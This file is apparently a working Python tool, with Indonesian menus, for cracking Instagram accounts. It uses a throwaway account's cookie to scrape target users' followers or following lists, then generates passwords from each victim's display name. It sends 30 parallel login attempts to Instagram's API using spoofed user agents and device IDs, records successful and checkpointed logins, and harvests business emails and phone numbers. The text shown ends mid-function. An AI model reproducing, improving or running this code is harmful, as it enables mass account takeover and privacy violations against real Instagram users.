import base64
import re, os, sys, json, bs4, uuid, hmac, hashlib, urllib, urllib.request, calendar, requests, random, datetime, time
from time import sleep
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich import print as cetak
from rich.panel import Panel as nel
from rich.table import Table as me
from rich.columns import Columns
from rich.console import Console as sol
console = Console()
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

Uid, Uuid = [], []
internal,external,success,checkpoint,loop,following=[],[],[],[],0,[]
method, xxkontol, Meledakcik, proxxy = [], [], [], []
ugen=[]
s = requests.Session()
day = datetime.now().strftime("%d-%b-%Y")
nyMnD, nyMxD, menudump, = 5, 10, []
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

#------------------[ COLOR TABLE FOR RICH ]-------------------#
LIGHT = "#875f5f" # LIGHT
GOLD    = "#ffd700" # GOLD
MEDIUM  = "#875fd7" # MEDIUM GREEN
PINK    = "#FF00FF" # PINK
WHITE  = "#FFFFFF" # WHITE
SKY     = "#87afff" # SKY BLUE
ORNG   = "#d78700" # ORANGE3
ORCH   = "#ff5fff" # MEDIUM ORCH

X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
IG_API = 'https://i.instagram.com/api/v1/'
IG_URL = 'z.p42.www.instagram.com'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': X_IG_APP_ID,'x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Petang"
	else:timenow = "Selamat Malam"
	return timenow
#------------------[ CLEAR-LAYAR ]-------------------#
def clear():
    try:os.system("	clear")
    except:pass


def InstaIgeh():
    rr = random.randint
    rc = random.choice
    UA1 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(9,14))}_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 31.0.0.14.97 (iPhone9,1; iOS {str(rr(9,14))}_2_5; en_US; en-US; scale=2.00; gamut=wide; {str(rr(700,799))}x{str(rr(1300,1500))})"
    UA2 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; SAMSUNG.{str(rr(111111,211111))}.SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/{str(rr(73,150))}.92.0.4515.166.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36"
    UA3 = f"Mozilla/5.0 (Linux; Android 7.0; LGT32 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Safari/537.36 Instagram 258.1.0.26.100 Android (24/7.0; {str(rr(200,240))}dpi; {str(rr(1100,1200))}x{str(rr(1800,1900))}; LGE/KDDI; LGT32; b5; b5; ja_JP; 412452718)"
    uacrack6 = f"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.65.0.3325.109.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (26/8.0.0;{str(rr(200,240))}480dpi; {str(rr(1100,1200))}1080x1920{str(rr(1800,1900))}; OnePlus; ONEPLUS A5000; OnePlus5; qcom; ru_UA; 98288242)"
    UA7 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX1851 Build/RKQ1..{str(rr(111111,211111))}.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.95.0.4638.74.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]"
    UA5 = f"Mozilla/5.0 (Linux; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.88.0.4324.93.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 172.0.0.21.123 Android (29/10;  {str(rr(200,240))}320dpi; {str(rr(1100,1200))}720x1464{str(rr(1800,1900))} ; INFINIX MOBILITY LIMITED/Infinix; Infinix X682B; Infinix-X682B; mt6769; tr_TR; 269790803)"
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UaMainn = random.choice([UA1, UA2, UA3,uacrack6,UA7,UA5,satu,dua,tiga,empat,lima])
    return UaMainn

def aguss():
    rr = random.randint
    rc = random.choice
    fbcr = str(
        random.choice([
            'TELKOMSEL', 'AXIS', 'Indosat', 'XL', '3SinyalKuatHemat',
            'Tsel-PakaiMasker', 'XL Axiata'
        ]))
    androversi = random.choice(["15_4", "14_3", "13_5", "14_5", "13_4"])
    build = ['MRA58K', 'UCC50Z', 'QKQ1.200127.002']
    andro = ['k', 'a', 'b', 'x', 'y', 'z', 'd', 'l']
    browser = ['HeyTapBrowser', 'MZBrowser']
    asep1 = random.choice(["Y6MLQN", "8G7LN3", "2783VM", "X35XFL", "W5T30Y"])
    asep4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {androversi} like Mac OS X) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/{str(rr(10,20))}.{str(rr(4,80))} Mobile/{asep1} Safari/{str(rr(500,800))}.{str(rr(2,30))}"
    asep5 = f"Mozilla/5.0 (Linux; Android {androversi} SM-N960N Build/QP1A.190711.020; wv) AppleWebKit/{str(rr(500,800))}.{str(rr(2,50))} (KHTML, like Gecko) Version/4.0 Chrome/{rr(10,99)}.0.{rr(1000,9999)}.{rr(73,150)} Whale/1.0.0.0 Crosswalk/25.80.14.20 Mobile Safari/537.36 NAVER(inapp; search; 598; 10.28.2)"
    asep10 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; itel A663L Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36"
    asep6 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; Infinix X6832 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/455.0.0.44.88;]"
    asep7 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; V1818CA Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 VivoBrowser/18.6.0.0"
    asep8 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; zh-tw; PCLM50 AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 HeyTapBrowser/40.8.27.1"
    asep9 = f"Mozilla/5.0 (Linux; AndroId {str(rr(2,13))}; zh-CN; M2104K10AC Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} UCBrowser/16.3.8.1289 Mobile Safari/537.36"
    v1 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro Build/{str(rc(build))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(73,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/349.0.0.39.470;]"
    v2 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; meizu 17 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} Mobile Safari/537.36"
    v3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN; MZ-meizu 17 Pro Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4999))}.{str(rr(73,150))} MZBrowser/8.{str(rr(1,20))}.1 Mobile Safari/537.36"
    v4 = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; {str(rc(andro))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(59,169))}.0.0.0 Mobile Safari/537.36"
    hir = f"Mozilla/5.0 (Linux; U; Android {str(rr(2,13))}; zh-CN MZ-MEIZU 18 Build/{str(rc(build))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3000,4900))}.{str(rr(100,150))} {str(rc(browser))}/9.{str(rr(1,20))}.1 Mobile safari/537.36"
    ua_rmx = f"Mozilla/5.0 (Linux; Android {str(rr(2,13))}; RMX{str(rr(1599,3999))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(89,120))}.0.{str(rr(3999,4999))}.{str(rr(55,129))} Mobile Safari/537.36"
    ua_oppo = f"Mozilla/5.0 (Linux; Android {str(rr(4,13))}; CPH{str(rr(1999,4999))} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(59,159))}.0.{str(rr(2999,4999))}.{str(rr(55,159))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/280.0.0.48.122;]"
    ya = random.choice([hir, asep4,asep5, asep10, asep6, asep7, asep8, asep9, v1, v2, v3, v4,ua_rmx,ua_oppo])
    return ya

def LoginCuyy():
    os.system('clear')
    Tabel1 = f"{H2}01\n02"
    Tabel2 = f"{P2} Login Menggunakan Cookie ( {H2}Recommended{P2} )\nKeluar ({M2} Tools{P2}"
    Tabel3 = f"{H2}ON\n{H2}ON"
    ColumnTabel = me()
    ColumnTabel.add_column(f"{P2}NO", style="bold green", justify='center')
    ColumnTabel.add_column(f"{P2}PILIHAN", style="bold green", justify='center',width=55)
    ColumnTabel.add_column(f"{P2}STATUS", style="bold green", justify='center')
    ColumnTabel.add_row(Tabel1,Tabel2, Tabel3)
    sol().print(ColumnTabel, justify='center',style=f"bold green")
    LoginMenu = input(f"└──╭➣  Pilih 1 Sampai 5 : ")
    if LoginMenu in [""]:
        prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan Sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3);LoginCuyy()
    elif LoginMenu in ["1","01"]:
        loginCookie()
    elif LoginMenu in ["2","02"]:
        exit()
    else:
        prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3);LoginCuyy()

def loginCookie():
    try:
        kuki=open('.kukis.txt','r').read()
    except FileNotFoundError:
        prints(Panel(f"{P2}Sebelum Login Pastikan Akun Tumbal Bersifat Publik Dan Tidak Private",width=80,padding=(0,4),style=f"bold green"))
        username = input(f'└──╭➣ {H}Masukan Username :{H} ')
        cookies =input(f'{P}└──╭➣ {H}Masukan Cookie   :{H} ')
        kuki = open('.kukis.txt','w').write(cookies)
        user = open('.username.txt','w').write(username)
        time.sleep(2)
        prints(Panel(f"{P2}Login Akun Tumbal Berhasil, Silahkan Jalankan Ulang Scriptnya",width=80,padding=(0,7),style=f"bold green"));exit()
        try:
            check = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':kuki},headers={"user-agent":InstaIgeh(),"x-ig-app-id":'1217981644879628'}) # 936619743392459 , 2763362503905702 , 1217981644879628
            informasi = check.json()["data"]["user"]
            nama = informasi["full_name"]
            followers = informasi["edge_followed_by"]["count"]
            following = informasi["edge_follow"]["count"]
            external.append(f'{nama}|{followers}|{following}')
        except  (ValueError,KeyError):
            prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.log rm -rf .username');exit()
        return external,user
    
def Menu():
    tabel1 = "01\n02\n03\n04\n05"
    tabel2 = (
        "Crack Dari Pengikut\nCrack Dari Mengikuti\nLihat Akun Hasil Crack\nKeluar"
    )
    tabel3 = "ON\nON\nON\nON"
    colume_tabel = me()
    colume_tabel.add_column("NO", style="bold green", justify='center')
    colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
    colume_tabel.add_column("STATUS", style="bold green", justify='center')
    colume_tabel.add_row(tabel1, tabel2, tabel3)
    sol().print(colume_tabel, justify='center', style="bold green")
    choice = input('└──╭➣ Pilih 1 Sampai 4: ')
    if choice == '':
        prints("Pilih Yang Benar, Jangan Kosong!")
        time.sleep(3)
        exit()
    elif choice in ('1', '01'):
        dumps(True)
    elif choice in ('2', '02'):
        dumps(False)
    elif choice in ('3', '03'):
        print('')
        for i in os.listdir('result'):
            prints(Panel(f"Hasil Crack {i}",width=80,style=f"bold green"))
            c = input(f'└──╭➣ Masukan Nama File : ')
            g = open("result/%s"%(c)).read().splitlines()
            print(f' Total Results : {H}{len(g)}[bold white]')
            prints(Panel(f"{P2}Proses Mengecek Status Akun. Silahkan Tunggu Sampai Proses Cek Selesai",width=80,style=f"bold green"))
            for s in g:
                usr = s.split("|")[0]
                pwd = s.split("|")[1]
            checkAPI(usr,pwd)
            prints(Panel(f"{P2}Proses Cek Akun Selesai, Silahkan Jalankan Ulang Scriptnya python run.py",width=80,padding=(0,3),style=f"bold green"))
    elif choice in ('4', '04'):
        exit()
    else:
        Menu()
        
def dumps(typess,xyz = []):
    kuki = open('.kukis.txt','r').read()
    if 'csrftoken' not in str(kuki):
        try:
            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = kuki).json()
            token = memek['config']['csrf_token']
            kuki['cookie'] +=';csrftoken=%s;'%(token)
        except Exception as e:
            os.system('rm -rf .kukis.txt')
            prints(Panel.fit(f"[bold red] Csrftoken tidak tersedia, dump tidak akan berjalan: {e} [bold white]"))
            exit()
    prints(Panel.fit(f"[bold green] Masukkan Username Instagram, Tekan CTRL+C Jika Ingin Berhenti Dump [bold white]"))
    users = input("username : ").split(',')
    try:
        for y in users:
            req = requests.get(f'https://www.instagram.com/{y}/', cookies = kuki).text
            uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
            if uid not in xyz:xyz.append(uid)
    except:pass
    try:
        mode = 'followers' if typess is True else 'following'
        for kintil in xyz:
            if typess is True:
                Graphql(True, kintil, kuki, '')
            else:
                Graphql(False, kintil, kuki, '')
    except:pass
    print("")
    passwordAPI()
    
def Graphql(typess, userid, cokie,after):
	global xx
	api = "https://www.instagram.com/graphql/query/"
	csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
	try:
		ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
		req = requests.get(api, params=mek, headers=ptk).json()
		if 'require_login' in req:
			if len(Uuid) > 0:
				pass
			else:
				exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
		khm = 'edge_followed_by' if typess is True else 'edge_follow'
		for xyz in req['data']['user'][khm]['edges']:
			username = xyz['node']['username']
			xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
			if xy not in Uuid:
				xx += 1
				Uuid.append(xy)
				print('\rMengumpulkan Uid {}{}{}                            '.format(M, len(Uuid), P), end='')
				time.sleep(0.0009)
		end = req['data']['user'][khm]['page_info']['has_next_page']
		if end is True:
			after = req['data']['user'][khm]['page_info']['end_cursor']
			Graphql(typess, userid, cokie, after)
		else:pass
	except:pass

def passwordAPI():
    global SistemLog
    prints(Panel(f"[[bold cyan]01[bold white]] Methode Api Nonce www.instagram.com \n[[bold cyan]02[bold white]] Methode Api i.instagtam.com\n[[bold cyan]03[bold white]] Methode Api i.instagtam.com [ Threads ] ",padding=(0,7),style=f"bold green"))
    u = input(f'└──╭➣ Pilih 1 Dan 3 : ')
    if u in ["1","01"]:
        SistemLog = "apinonce"
    elif u in ["2","02"]:
        SistemLog = "api"
    elif u in ["3","03"]:
        SistemLog = "threads"
    else:
        SistemLog = "threads"
    CrackStart()
        
def CrackStart():
    prints(Panel.fit(f"[bold green]Crack Sedang Berlangsung. Jika Tidak Ada Hasil Hidupkan Mode Pesawat 5 detik"))
    with ThreadPoolExecutor (max_workers=30) as ASF:
        for i in Uuid:
            try:
                username, name = i.split('|')
                kontol = Password(name)
                if SistemLog == "apinonce":
                    ASF.submit(Crack_i, username, kontol)
                elif SistemLog == "api":
                    ASF.submit(Crack_w, username, kontol)
                elif SistemLog == "threads":
                    ASF.submit(Crack_x, username, kontol)
            except:pass
    prints(Panel.fit(f"[bold green]Crack Telah Selesai"))
    exit()

def Password(name):
    xxzx= []
    for nama in name.split(' '):
        nama = nama.lower()
        if len(nama) <3: continue
        elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'12345789');xxzx.append(nama+'01');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'09');xxzx.append(nama+'15');xxzx.append(nama+'17');xxzx.append(nama+'18');xxzx.append(nama+'19');xxzx.append(nama+'24');xxzx.append(nama+'28')
        else:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'12345789');xxzx.append(nama+'01');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'07');xxzx.append(nama+'08');xxzx.append(nama+'09');xxzx.append(nama+'15');xxzx.append(nama+'17');xxzx.append(nama+'18');xxzx.append(nama+'19');xxzx.append(nama+'24');xxzx.append(nama+'28')
    return(xxzx)
    
def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :X_IG_APP_ID})
			profil_info_target = s.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone

def Crack_i(username, memek):
    global Ok, Cp, Loop
    sys.stdout.write(f"\r{Colors.BOLD}[Instagram App]{Colors.ENDC} {Colors.OKCYAN}[Proses: {Loop}/{len(Uuid)}/{Colors.OKCYAN}{str(username)[:6]}]{Colors.ENDC} Success: {Colors.OKGREEN}{Ok}{Colors.ENDC} Checkpoint: {Colors.WARNING}{Cp}{Colors.ENDC}"),
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            useragent = InstaIgeh()
            device_id = str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            data = {'signed_body': 'aa792afa7c0f5b1680531edb1681750fcc45a3718142c399d2420291431be7f1.{"id":"'+str(device_id)+'","server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_login_forgot_password_universe,ig_android_session_scoped_logger,ig_android_smartlock_hints_universe,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,direct_app_deep_linking_universe,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_fb_invite_entry_points,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"}','ig_sig_key_version': '4'}
            ses.headers.update({
                'X-Pigeon-Session-Id': str(uuid.uuid4()),
                'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'MOBILE(LTE)',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': useragent,
                'Accept-Language': 'id-ID, en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),
            })
            try:
                _csrftoken = ses.cookies.get_dict()['csrftoken']
            except Exception as e:
                _csrftoken = ('')
            ses.headers.update({'Cookie': ("; ".join([str(x)+"="+str(y) for x,y in ses.cookies.get_dict().items()])),'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),'Connection': 'keep-alive',})
            data = (f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba\.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(_csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(str(password))}%22%2C%22login_attempt_count%22%3A%221%22%7D&ig_sig_key_version=4')
            response2 = ses.post('https://i.instagram.com/api/v1/web/accounts/request_one_tap_login_nonce/',data=data, allow_redirects = True)
            if 'logged_in_user' in str(response2.text) or 'sessionid' in ses.cookies.get_dict().keys():
                Ok+=1
                x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(username),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
                x_jason = x.json()["data"]["user"]
                pengikut = x_jason["edge_followed_by"]["count"]
                mengikut = x_jason["edge_follow"]["count"]
                postingan = x_jason["edge_owner_to_timeline_media"]["count"]
                cookie = ";".join([key+"="+value.replace('"','') for key, value in s.cookies.get_dict().items()])
                tree = Tree(Panel.fit(f"{H2}{username} {P2}| {H2}{password}"))
                tree.add(Panel.fit(f"{P2}Followers : {H2}{pengikut}")).add(Panel.fit(f"{P2}Following : {H2}{mengikut}"))
